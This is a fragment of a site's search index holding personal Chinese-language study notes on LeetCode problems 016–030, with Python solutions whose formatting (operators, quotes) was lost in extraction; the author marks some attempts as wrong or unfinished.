\u6ce8\u610f\u7f29\u8fdb\uff01\uff01\uff01\uff01 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution : def threeSumClosest ( self , nums , target ): :type nums: List[int] :type target: int :rtype: int nums . sort () record_diff = float ( inf ) for i , currentNum in enumerate ( nums [: - 2 ]): left = i + 1 right = len ( nums ) - 1 while left right : if currentNum + nums [ left ] + nums [ right ] == target : return target diff = ( currentNum + nums [ left ] + nums [ right ]) - target if abs ( diff ) abs ( record_diff ): record_diff = diff if diff 0 : right = right - 1 else : left = left + 1 return target + record_diff","title":"\u7591\u95ee"},{"location":"LeetCode/vol 0/011-020/#017","text":"\u7ed9\u5b9a\u4e00\u4e2a\u5305\u542b2-9\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u624b\u673a\u952e\u76d8\u53ef\u80fd\u51fa\u73b0\u7684\u5b57\u7b26 \u611f\u89c9\u4f7f\u7528python\u672c\u8eab\u7684\u6027\u8d28\u5c31\u53ef\u4ee5\u6c42\u5f97\u4e86\uff0c\u4f46\u662f\u6700\u597d\u8fd8\u662f\u4f7f\u7528c\u7684\u601d\u60f3 \u4e00\u5f00\u59cb\u65e0\u6cd5\u786e\u5b9a\u5faa\u73af\u4e2a\u6570\uff0c\u5faa\u73af\u957f\u5ea6 \u7a77\u4e3e\u54af\uff0c\u56de\u6eaf\u54af","title":"017"},{"location":"LeetCode/vol 0/011-020/#_10","text":"\u611f\u89c9\u8fd8\u662f\u5bf9\u9012\u5f52\u4e0d\u719f\u6089 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class Solution ( object ): def letterCombinations ( self , digits ): type digits: str rtype: list[str] def dfs ( num , string , res ): if num == length : res . append ( string ) return for letter in dict [ digits [ num ]]: dfs ( num + 1 , string + letter , res ) dict = { 2 : [ a , b , c ], 3 : [ d , e , f ], 4 : [ g , h , i ], 5 : [ j , k , l ], 6 : [ m , n , o ], 7 : [ p , q , r , s ], 8 : [ t , u , v ], 9 : [ w , x , y , z ] } res = [] length = len ( digits ) if length == 0 : return [] dfs ( 0 , , res ) return res for i in Solution () . letterCombinations ( 2352 ): print ( i )","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#_11","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution : def letterCombinations ( self , digits ): :type digits: str :rtype: List[str] if len ( digits ) == 0 : return [] num_to_char = { 2 : abc , 3 : def , 4 : ghi , 5 : jkl , 6 : mno , 7 : pqrs , 8 : tuv , 9 : wxyz } res = [ i for i in num_to_char [ digits [ 0 ]]] for i in digits [ 1 :]: res = [ m + n for m in res for n in num_to_char [ i ]] return res","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/011-020/#018","text":"\u7ed9\u5b9a\u4e00\u4e2atarget\uff0c\u4f7f\u75284\u4e2a\u6570\u5b57\u62fc\u51d1\u5b83 4sum","title":"018"},{"location":"LeetCode/vol 0/011-020/#_12","text":"\u6211\u5e72\u8106\u8bd5\u8bd53sum closet\u7b97\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Solution : def fourSum ( self , nums , target ): :type nums: List[int] :type target: int :rtype: List[List[int]] nums . sort () res = [] for i in range ( len ( nums ) - 3 ): for j in range ( i + 1 , len ( nums ) - 2 ): start = j + 1 end = len ( nums ) - 1 while start end : value = nums [ i ] + nums [ j ] + nums [ start ] + nums [ end ] if value == target : res . append ([ nums [ i ], nums [ j ], nums [ start ], nums [ end ]]) start += 1 elif value target : start += 1 elif value target : end -= 1 res = list ( set ([ tuple ( t ) for t in res ])) res = [ list ( v ) for v in res ] return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#_13","text":"Todo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 class Solution : def fourSum ( self , nums , target ): :type nums: List[int] :type target: int :rtype: List[List[int]] def findNsum ( nums , target , N , result , results ): if N 2 or len ( nums ) N or nums [ 0 ] * N target or nums [ - 1 ] * N target : return if N == 2 : l = 0 r = len ( nums ) - 1 while l r : s = nums [ l ] + nums [ r ] if s == target : results . append ( result + [ nums [ l ], nums [ r ]]) l += 1 r -= 1 while l r and nums [ l ] == nums [ l - 1 ]: l += 1 while l r and nums [ r ] == nums [ r + 1 ]: r -= 1 elif s target : l += 1 else : r -= 1 else : for i in range ( len ( nums ) - N + 1 ): if i == 0 or ( i 0 and nums [ i ] != nums [ i - 1 ]): findNsum ( nums [ i + 1 ::], target - nums [ i ], N - 1 , result + [ nums [ i ]], results ) results = [] result = [] findNsum ( sorted ( nums ), target , 4 , result , results ) return results","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/011-020/#019","text":"\u7ed9\u5b9a\u4ee5\u4e2a\u5355\u94fe\u8868\uff0c\u79fb\u9664\u5012\u6570\u7b2cn\u4e2a\u8282\u70b9 \u5148\u66b4\u529b\u8bd5\u8bd5 \u6709\u4e00\u4e9b\u8fb9\u754c\u6761\u4ef6 \u5012\u6570\u7b2cn\u4e2a\u8282\u70b9\u662fhead\u8282\u70b9 \u5012\u6570\u7b2cn\u4e2a\u8282\u70b9\u662f\u5c3e\u8282\u70b9","title":"019"},{"location":"LeetCode/vol 0/011-020/#_14","text":"\u76f4\u63a5\u66b4\u529b\u4e0a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def removeNthFromEnd ( self , head , n ): :type head: ListNode :type n: int :rtype: ListNode p = head record = [] while p != None : record . append ( p ) p = p . next if len ( record ) == 1 : del ( head ) return None if len ( record ) == n : return record [ 1 ] left = record [ - n - 1 ] left . next = left . next . next record [ - n ] . next = None del ( record [ - n ]) return head","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#_15","text":"\u8fd9\u4e2a\u65b9\u5f0f\u6bd4\u66b4\u529b\u7684\u65b9\u5f0f\u806a\u660e\u591a\u4e86 \u9996\u5148right\u5148\u8d70n\u6b65\uff0c\u7136\u540eleft\u5f00\u59cb\u8ba1\u7b97 \u63a5\u7740\u904d\u5386\u4e4b\uff0c\u5982\u679cright\u8d70\u5b8c\u4e86\uff0c\u90a3\u4e48left\u521a\u597d\u5230\u8fbe\u5012\u6570\u7b2cn\u4e2a\u8282\u70b9 \u56e0\u4e3aright\u4e0eleft\u76f8\u5deen\u4e2a\u8282\u70b9\uff0cright\u8d70\u5b8c\u4e86\uff0c\u90a3\u4e48left\u79bb\u5b8c\u6210\u904d\u5386\u8fd8\u6709n\u4e2a\u8282\u70b9\uff0c\u6240\u4ee5\u662f\u5012\u6570\u7b2cn\u4e2a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution : def removeNthFromEnd ( self , head , n ): :type head: ListNode :type n: int :rtype: ListNode p = head right = p while n 0 : n -= 1 right = right . next left = head if not right : head = head . next return head while right and right . next : right = right . next left = left . next left . next = left . next . next return head","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/011-020/#020","text":"\u5224\u65ad\u4e00\u4e2a\u5de6\u53f3\u62ec\u53f7\u662f\u5426\u662f\u5408\u6cd5\u7684 \u611f\u89c9\u4f7f\u7528stack\uff1f","title":"020"},{"location":"LeetCode/vol 0/011-020/#_16","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def isValid ( self , s ): :type s: str :rtype: bool stack = [] left = [ ( , [ , { ] for i in range ( len ( s )): if s [ i ] in left : stack . append ( s [ i ]) continue elif s [ i ] == ) : if len ( stack ) == 0 or stack . pop () != ( : return False elif s [ i ] == ] : if len ( stack ) == 0 or stack . pop () != [ : return False elif s [ i ] == } : if len ( stack ) == 0 or stack . pop () != { : return False return len ( stack ) == 0","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/021-030/","text":"021 \u94fe\u63a5\u4e24\u4e2a\u5df2\u7ecf\u6392\u5e8f\u597d\u7684\u94fe\u8868\uff0c\u5e76\u4e14\u8ba9\u65b0\u94fe\u8868\u4fdd\u6301\u6392\u5e8f\u597d \u4e0d\u80fd\u65b0\u5efa\u94fe\u8868 1 2 Input: 1- 2- 4, 1- 3- 4 Output: 1- 1- 2- 3- 4- 4 \u60f3\u6cd5 \u904d\u5386\u4e4b\u7136\u540e\u66b4\u529b 0- 2- 6 1- 3- 5 \u540e\u6765\u53d1\u73b0\u4e0b\u9762\u4ee3\u7801\u4e0d\u884c \u6ca1\u6709\u8003\u8651\u4f20\u503c\u4f20\u5f15\u7528\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u51fa\u9519 \u4e0d\u8fc7\u611f\u89c9\u5373\u4f7f\u4e0d\u51fa\u9519\u4e5f\u662f\u65e0\u6cd5\u5de5\u4f5c\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution : def mergeTwoLists ( self , l1 , l2 ): :type l1: ListNode :type l2: ListNode :rtype: ListNode p1 = l1 p2 = l2 while p1 and p2 : if p1 . val = p2 . val : # \u8fd9\u91cc\u53d6\u5f15\u7528\u4e86\uff0c\u6ca1\u6709\u53d6\u503c\uff0c\u51fa\u9519 recordL1 = p1 p1 . next = p2 p1 = recordL1 . next p2 = p2 . next else : recordL2 = p2 p2 . next = p1 p1 = p2 p1 = p1 . next . next p2 = recordL2 . next return l1 \u6240\u4ee5\u91cd\u65b0\u6784\u601d\uff0c\u60f3\u4e86\u60f3\u8fd8\u662f\u56de\u5f52\u521d\u5fc3\u641e\u4e2a\u4e34\u65f6\u53d8\u91cf\u5427 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Solution : def mergeTwoLists ( self , l1 , l2 ): :type l1: ListNode :type l2: ListNode :rtype: ListNode head = ListNode ( HEAD ) p = head p1 = l1 p2 = l2 while p1 and p2 : if p1 . val = p2 . val : p . next = p2 p2 = p2 . next else : p . next = p1 p1 = p1 . next p = p . next p . next = p1 or p2 return head . next 022 \u751f\u6210\u62ec\u53f7\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u6570n\uff0c\u751f\u6210\u6240\u6709\u7b26\u5408\u7531n\u4e2a\u62ec\u53f7\u7684\u5408\u6cd5\u62ec\u53f7\u5b57\u7b26\u4e32 1 2 3 4 5 6 7 8 n = 3 [ ((())) , (()()) , (())() , ()(()) , ()()() ] \u60f3\u6cd5 \u9047\u5230\u62ec\u53f7\u5c31\u7528stack\uff1f \u6cd5\u4e00 \u9996\u5148\u662f\u9012\u5f52 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def generateParenthesis ( self , n ): :type n: int :rtype: List[str] res = [] def dfs ( currentStr , left , right ): if left == n and left == right : res . append ( currentStr ) else : if left n : dfs ( currentStr + ( , left + 1 , right ) if right left : dfs ( currentStr + ) , left , right + 1 ) dfs ( , 0 , 0 ) return res 023 \u5408\u5e76\u591a\u4e2a\u6392\u5e8f\u597d\u7684\u94fe\u8868 \u60f3\u6cd5 \u5148\u6765\u4e2a\u66b4\u529b\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Solution : def mergeKLists ( self , lists ): :type lists: List[ListNode] :rtype: ListNode def haveSth ( lists ): for i in lists : if i != None : return True return False head = ListNode ( HEAD ) p = head pLists = [ listnode for listnode in lists ] while haveSth ( pLists ): currentMin = ListNode ( float ( inf )) currentMin_index = 0 for i in range ( len ( pLists )): if pLists [ i ] is not None : if pLists [ i ] . val currentMin . val : currentMin = pLists [ i ] currentMin_index = i # break p . next = currentMin p = p . next if pLists [ currentMin_index ]: pLists [ currentMin_index ] = pLists [ currentMin_index ] . next return head . next \u8be5\u7b97\u6cd5\u7528\u4e869000\u591ams\uff0c\u90a3\u4e48\u9700\u8981\u629b\u5f03\u6216\u8005\u4f18\u5316 \u5176\u5b9e\u53ea\u9700\u8981\u53d6\u4e2a\u6700\u5c0f\u503c\uff0c\u6240\u4ee5\uff0c\u5c0f\u6839\u5806\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import heapq class Solution : def mergeKLists ( self , lists ): :type lists: List[ListNode] :rtype: ListNode heap = [] for l in lists : if l != None : heap . append (( l . val , l )) heapq . heapify ( heap ) dummy = ListNode ( 0 ) cur = dummy while heap : _ , h = heapq . heappop ( heap ) cur . next = h cur = cur . next if h . next : heapq . heappush ( heap , ( h . next . val , h . next )) return dummy . next \u4f46\u662f\u7528\u4e86import\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5df1\u5199\u4e2a\u5c0f\u6839\u5806\uff0c\u6216\u662f\u81ea\u5df1\u8bfbheapq 024 \u4ea4\u6362\u94fe\u8868\u7684\u76f8\u90bb\u7684\u4e24\u4e2a\u8282\u70b9 1 Given 1- 2- 3- 4, you should return the list as 2- 1- 4- 3. \u76f4\u63a5\u66b4\u529b\u4e86 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def swapPairs ( self , head ): :type head: ListNode :rtype: ListNode HEAD = ListNode ( HEAD ) HEAD . next = head p = HEAD while p != None : left = p . next if p . next else False right = p . next . next if p . next else False if left and right : left . next = right . next if right . next else None right . next = left p . next = right p = p . next . next else : break return HEAD . next 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def swapPairs ( self , head ): :type head: ListNode :rtype: ListNode if not head : return None newHead = head . next if head . next else head curr = head prev = None while curr and curr . next : temp = curr . next curr . next = curr . next . next temp . next = curr if prev : prev . next = temp prev = curr curr = curr . next return newHead 025 024\u662f\u4ea4\u6362\u4e24\u4e2a\u76f8\u90bb\u7684\u8282\u70b9\uff0c025\u662f\u7ffb\u8f6c\u8fde\u7eed\u7684n\u4e2a\u8282\u70b9 1 2 3 4 Given this linked list: 1- 2- 3- 4- 5 For k = 2, you should return: 2- 1- 4- 3- 5 For k = 3, you should return: 3- 2- 1- 4- 5 \u60f3\u6cd5 \u7528n\u6765\u63a7\u5236\u5faa\u73af\u6df1\u5ea6 \u5b9e\u73b0\u94fe\u8868\u7684\u7ffb\u8f6c\uff1f \u5efa\u7acb\u4e00\u4e2a\u5faa\u73af\uff0c\u540e\u79fb\u4f4dn\u4e2a\u8282\u70b9\uff0c\u5982\u679c\u5b58\u5728\u9700\u8981\u53cd\u8f6c\uff0c\u5e76\u8bb0\u5f55\u8282\u70b9\u4f4d\u7f6e \u4e00\u5f00\u59cb\u5199\u7684\u662f\u5de6\u95ed\u53f3\u5f00\u7684\uff0c\u5982\u4e0b\uff0c\u5f53head\u4e3a0\uff0cend\u4e3a2\u65f6\uff0c\u53cd\u8f6c\u8282\u70b90\u548c1 1 2 0 - 1 - 2 h e \u4f46\u662f\u51fa\u9519\u4e86\uff0c\u6ca1\u8003\u8651\u597d\u3002\u5904\u4e8e\u4e0b\u9762\u60c5\u51b5\u65f6\uff0c\u4e00\u5f00\u59cb\u7684\u7b97\u6cd5\u5c31\u76f4\u63a5\u8df3\u51fa\u5faa\u73af\u4e86\uff0c\u4f46\u662f\u8fd8\u662f\u9700\u8981\u53cd\u8f6c\u7684 1 2 0 - 1 - None h e \u6240\u4ee5\u9700\u8981\u91cd\u65b0\u5199\u4e2a\uff0c\u6216\u8005\u662f\u6211\u7684\u7b97\u6cd5\u51fa\u9519\u4e86 \u6700\u540e\u8fd8\u662f\u7b97\u6cd5\u51fa\u9519\u4e86 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Solution : def reverse ( self , headNode , endNode ): prev = endNode p = headNode while p != endNode : tmp = p . next p . next = prev prev = p p = tmp return prev def reverseKGroup ( self , head , k ): :type head: ListNode :type k: int :rtype: ListNode p = head for i in range ( k ): if not p : return head p = p . next newHead = reverse ( head , p ) head . next = self . reverseKGroup ( p , k ) return newHead \u9519\u8bef\u4ee3\u7801 Todo \u6539\u9519 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 class Solution : def reverse ( self , headNode , endNode ): TMPHEAD = ListNode ( HEAD ) TMPHEAD . next = endNode p = headNode while p != endNode : currentNode = p p = p . next currentNode . next = TMPHEAD . next TMPHEAD . next = currentNode return TMPHEAD . next def getKthNode ( self , head , k ): p = head for _ in range ( k ): p = p . next if p is None : break return p def reverseKGroup ( self , head , k ): :type head: ListNode :type k: int :rtype: ListNode if not head or head . val == None : return HEAD = ListNode ( HEAD ) HEAD . next = head link = HEAD p = head endNode = self . getKthNode ( p , k ) while p and endNode : headNode = self . reverse ( p , endNode ) p = p . next endNode = self . getKthNode ( p , k ) link . next = headNode link = self . getKthNode ( link , k ) return HEAD . next \u4ee3\u7801\u81c3\u80bf\uff0c\u6839\u636e\u4e4b\u524d\u7684\u53d8\u5316\u6539\u52a8\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 class Solution : def reverse ( self , headNode , endNode ): TMPHEAD = ListNode ( HEAD ) TMPHEAD . next = endNode p = headNode while p != endNode : currentNode = p p = p . next currentNode . next = TMPHEAD . next TMPHEAD . next = currentNode return TMPHEAD . next def reverseKGroup ( self , head , k ): :type head: ListNode :type k: int :rtype: ListNode p = head for i in range ( k ): if p is None : return head p = p . next newHead = self . reverse ( head , p ) head . next = self . reverseKGroup ( p , k ) return newHead \u603b\u7ed3 \u94fe\u8868\u53cd\u8f6c\u8fd8\u662f\u4e0d\u6e05\u6670\uff0c\u867d\u7136\u601d\u8def\u4e00\u6837\u4f46\u8fd8\u662f\u82b1\u4e86\u70b9\u65f6\u95f4\u91cd\u65b0\u7406\u89e3 \u5fd8\u8bb0\u4f7f\u7528\u9012\u5f52 026 \u7ed9\u5b9a\u4e00\u4e2a \u6392\u597d\u5e8f \u7684\u6570\u7ec4\uff0c\u5220\u9664\u91cd\u590d\u9879\uff0c\u7ed9\u51fa\u5220\u9664\u91cd\u590d\u9879\u540e\u7684\u957f\u5ea6 \u8981\u6c42\uff0c\u989d\u5916\u7684O(1)\u5185\u5b58 \u5751 \u4e3a\u4ec0\u4e48\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6574\u6570\u4f46\u4f60\u7684\u7b54\u6848\u662f\u4e00\u4e2a\u6570\u7ec4\uff1f \u8bf7\u6ce8\u610f\uff0c\u8f93\u5165\u6570\u7ec4\u662f\u901a\u8fc7\u5f15\u7528\u4f20\u5165\u7684\uff0c\u8fd9\u610f\u5473\u7740\u8c03\u7528\u8005\u4e5f\u53ef\u4ee5\u77e5\u9053\u5bf9\u8f93\u5165\u6570\u7ec4\u7684\u4fee\u6539\u3002 \u4f7f\u7528\u8fd4\u56de\u7684\u957f\u5ea6\uff0c\u8fd9\u56de\u6253\u5370\u51fa\u7b2c\u4e00\u4e2a\u7b2ci\u5927\u7684\u503c \u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u662f\u8fd4\u56de\u4e00\u4e2a\u6570\uff0c\u662f\u5bf9\u8fd9\u4e2a\u6570\u7ec4\u8fdb\u884c\u64cd\u4f5c\uff0c\u540c\u65f6\uff0c\u4e0d\u80fd\u4f7f\u7528\u4e00\u4e2a\u989d\u5916\u6570\u7ec4\u6765\u653e\u7f6e\u6570 \u60f3\u6cd5 \u66b4\u529b\u904d\u5386\u8bd5\u8bd5 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def removeDuplicates ( self , nums ): :type nums: List[int] :rtype: int if len ( nums ) = 1 : return len ( nums ) i = 1 while i len ( nums ): if nums [ i ] == nums [ i - 1 ]: del ( nums [ i ]) else : i += 1 return len ( nums ) \u8fd9\u91cc\u7528\u4e86python\u672c\u8eab\u7684\u51fd\u6570 \u90a3\u4e48\u7528\u4e00\u4e2a\u53d8\u91cf\u8bb0\u5f55\u5206\u914d\u597d\u7684index\uff1f \u6cd5\u4e8c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def removeDuplicates ( self , nums ): :type nums: List[int] :rtype: int if len ( nums ) = 1 : return len ( nums ) index = 1 for i in range ( 1 , len ( nums )): if nums [ i ] nums [ i - 1 ]: nums [ index ] = nums [ i ] index += 1 # del(nums[index:]) return index 027 \u7ed9\u5b9a\u4ee5\u4e2a\u6570\u7ec4nums\u548c\u6570\u5b57val\uff0c\u5c06nums\u5185\u7684\u6240\u6709\u503c\u4e3aval\u7684\u5b9e\u4f8b\u5220\u9664\u6389 \u8981\u6c42\u4e0e026\u7684\u4e00\u6837 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution ( object ): def removeElement ( self , nums , val ): :type nums: List[int] :type val: int :rtype: int # start, end = 0, len(nums) - 1 # while start = end: # if nums[start] == val: # nums[start], nums[end], end = nums[end], nums[start], end - 1 # else: # start += 1 # return start begin = 0 for i in range ( len ( nums )): if nums [ i ] != val : nums [ begin ] = nums [ i ] begin += 1 return begin 028 \u5b9e\u73b0\u51fd\u6570\u6765\u5f97\u5230\u5b50\u5b57\u7b26\u4e32\u5728\u5b57\u7b26\u4e32\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e 1 2 3 4 5 Input: haystack = hello , needle = ll Output: 2 Input: haystack = aaaaa , needle = bba Output: -1 \u60f3\u6cd5 \u6211\u600e\u4e48\u611f\u89c9\u548c026\uff0c027\u7684\u9898\u76ee\u5dee\u4e0d\u591a \u4ec0\u4e48\u9898\u5148\u66b4\u529b\u8bd5\u8bd5 \u4e00\u5f00\u59cb\u7684\u66b4\u529b\u601d\u8def\u51fa\u9519\u4e86\uff0c\u5f53\u78b0\u5230\u4e0b\u9762\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u65f6\u5019\u5c31\u51fa\u9519\u4e86 \u4e00\u5f00\u59cb\u7684\u66b4\u529b\u601d\u8def\u662f\u5728haystack\u627eneedle[0]\u7684\u5b57\u7b26\uff0c\u7136\u540e\u9010\u4e2a\u68c0\u67e5\uff0c\u4f46\u662f\u6ca1\u6709\u8003\u8651\u7c7b\u4f3c\u4e0b\u9762\u53ef\u80fd\u6709\u516c\u5171\u5f00\u5934\u5b57\u7b26\u4e32\u7684\u60c5\u51b5 1 2 mississippi issipi \u90a3\u4e48\u52bf\u5fc5\u8981\u6362\u4e2a\u66b4\u529b\u601d\u8def\uff0c\u6bd4\u5982\u66f4\u539f\u59cb\u7684\u65b9\u5f0f\uff0c\u4f46\u662f\u8fd9\u6837\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u592a\u9ad8\u4e86 \u90a3\u4e48\u80fd\u5426\u4e0aDP\u5462\uff1f \u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4dp[i][j]\uff1f\u8868\u793ahaystack[i]\u4e2dneedle[j]\u7684\u51fa\u73b0\u7684\u4f4d\u7f6e\uff1f \u90a3\u4e48\u5982\u4f55\u8fed\u4ee3\u5462\uff0c\u521d\u59cb\u72b6\u6001\uff1f \u4e0d\u5bf9\u3002\u3002\u3002\u5e94\u8be5\u662fKMP \u5176\u4ed6 IMPORTANT \u660e\u663e\u7684KMP\u7b97\u6cd5 \u4f46\u662f\u6211\u5fd8\u4e86 \u5173\u952e\u662f\u5efa\u8bae\u4e00\u4e2anext\u6570\u7ec4\uff08\u8fd9\u91cc\u7528rollback\uff09\u4ee3\u66ff \u8be6\u60c5\u770b\u6ce8\u91ca 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 class Solution : def strStr ( self , haystack : str , needle : str ) - int : if len ( needle ) == 0 : return 0 res = - 1 # \u65f6\u95f4\u590d\u6742\u5ea6 n^2 # for i in range(len(haystack)): # j = 0 # while j len(needle) and i len(haystack) and haystack[i] == needle[j]: # i += 1 # j += 1 # if j == len(needle): # return i-len(needle) # return res # KMP\u7b97\u6cd5\u5230\u5e95\u600e\u4e48\u5b9e\u73b0\u6765\u7740 # \u8bb0\u5f55\u4e00\u4e2a\u6570\u7ec4\uff0c\u9632\u6b62\u91cd\u590d\u5224\u65ad # \u90a3\u4e2a\u6570\u7ec4\u600e\u4e48\u5efa\u7acb\u6765\u7740\uff1f # abcdabeab #-100012012 rollback = [ 0 for i in range ( len ( needle ))] rollback [ 0 ] = - 1 i , j = 0 , - 1 while i len ( needle ) - 1 : if j ==- 1 or needle [ i ] == needle [ j ]: i += 1 j += 1 rollback [ i ] = j else : j = rollback [ j ] i = j = 0 while i len ( haystack ): # roll-back while j = 0 and needle [ j ] != haystack [ i ]: j = rollback [ j ] i , j = i + 1 , j + 1 if j == len ( needle ): return i - len ( needle ) return - 1 029 Todo \u7ed9\u5b9a\u4e24\u4e2a\u6574\u6570\u9664\u6570\u4e0e\u4f59\u6570\uff0c\u8fdb\u884c\u9664\u6cd5\u800c\u4e0d\u4f7f\u7528 / , * , % \u901a\u8fc7\u79fb\u4f4d\u6765\u505a\uff1f 030 Todo \u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5728\u8fd9\u5b57\u7b26\u4e32\u4e2d\u67e5\u627e \u4e00\u4e2a\u7531\u76f8\u540c\u957f\u5ea6\u5b57\u7b26\u4e32\u6784\u6210\u7684\u5217\u8868 \u7684\u6240\u6709\u5bf9\u5e94\u6210\u5458\u7684\u5728\u6bcd\u5b57\u7b26\u4e32\u7684\u7d22\u5f15","title":"021 030"},{"location":"LeetCode/vol 0/021-030/#021","text":"\u94fe\u63a5\u4e24\u4e2a\u5df2\u7ecf\u6392\u5e8f\u597d\u7684\u94fe\u8868\uff0c\u5e76\u4e14\u8ba9\u65b0\u94fe\u8868\u4fdd\u6301\u6392\u5e8f\u597d \u4e0d\u80fd\u65b0\u5efa\u94fe\u8868 1 2 Input: 1- 2- 4, 1- 3- 4 Output: 1- 1- 2- 3- 4- 4 \u60f3\u6cd5 \u904d\u5386\u4e4b\u7136\u540e\u66b4\u529b 0- 2- 6 1- 3- 5 \u540e\u6765\u53d1\u73b0\u4e0b\u9762\u4ee3\u7801\u4e0d\u884c \u6ca1\u6709\u8003\u8651\u4f20\u503c\u4f20\u5f15\u7528\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u51fa\u9519 \u4e0d\u8fc7\u611f\u89c9\u5373\u4f7f\u4e0d\u51fa\u9519\u4e5f\u662f\u65e0\u6cd5\u5de5\u4f5c\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution : def mergeTwoLists ( self , l1 , l2 ): :type l1: ListNode :type l2: ListNode :rtype: ListNode p1 = l1 p2 = l2 while p1 and p2 : if p1 . val = p2 . val : # \u8fd9\u91cc\u53d6\u5f15\u7528\u4e86\uff0c\u6ca1\u6709\u53d6\u503c\uff0c\u51fa\u9519 recordL1 = p1 p1 . next = p2 p1 = recordL1 . next p2 = p2 . next else : recordL2 = p2 p2 . next = p1 p1 = p2 p1 = p1 . next . next p2 = recordL2 . next return l1 \u6240\u4ee5\u91cd\u65b0\u6784\u601d\uff0c\u60f3\u4e86\u60f3\u8fd8\u662f\u56de\u5f52\u521d\u5fc3\u641e\u4e2a\u4e34\u65f6\u53d8\u91cf\u5427","title":"021"},{"location":"LeetCode/vol 0/021-030/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Solution : def mergeTwoLists ( self , l1 , l2 ): :type l1: ListNode :type l2: ListNode :rtype: ListNode head = ListNode ( HEAD ) p = head p1 = l1 p2 = l2 while p1 and p2 : if p1 . val = p2 . val : p . next = p2 p2 = p2 . next else : p . next = p1 p1 = p1 . next p = p . next p . next = p1 or p2 return head . next","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/021-030/#022","text":"\u751f\u6210\u62ec\u53f7\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u6570n\uff0c\u751f\u6210\u6240\u6709\u7b26\u5408\u7531n\u4e2a\u62ec\u53f7\u7684\u5408\u6cd5\u62ec\u53f7\u5b57\u7b26\u4e32 1 2 3 4 5 6 7 8 n = 3 [ ((())) , (()()) , (())() , ()(()) , ()()() ] \u60f3\u6cd5 \u9047\u5230\u62ec\u53f7\u5c31\u7528stack\uff1f","title":"022"},{"location":"LeetCode/vol 0/021-030/#_2","text":"\u9996\u5148\u662f\u9012\u5f52 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def generateParenthesis ( self , n ): :type n: int :rtype: List[str] res = [] def dfs ( currentStr , left , right ): if left == n and left == right : res . append ( currentStr ) else : if left n : dfs ( currentStr + ( , left + 1 , right ) if right left : dfs ( currentStr + ) , left , right + 1 ) dfs ( , 0 , 0 ) return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/021-030/#023","text":"\u5408\u5e76\u591a\u4e2a\u6392\u5e8f\u597d\u7684\u94fe\u8868 \u60f3\u6cd5 \u5148\u6765\u4e2a\u66b4\u529b\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Solution : def mergeKLists ( self , lists ): :type lists: List[ListNode] :rtype: ListNode def haveSth ( lists ): for i in lists : if i != None : return True return False head = 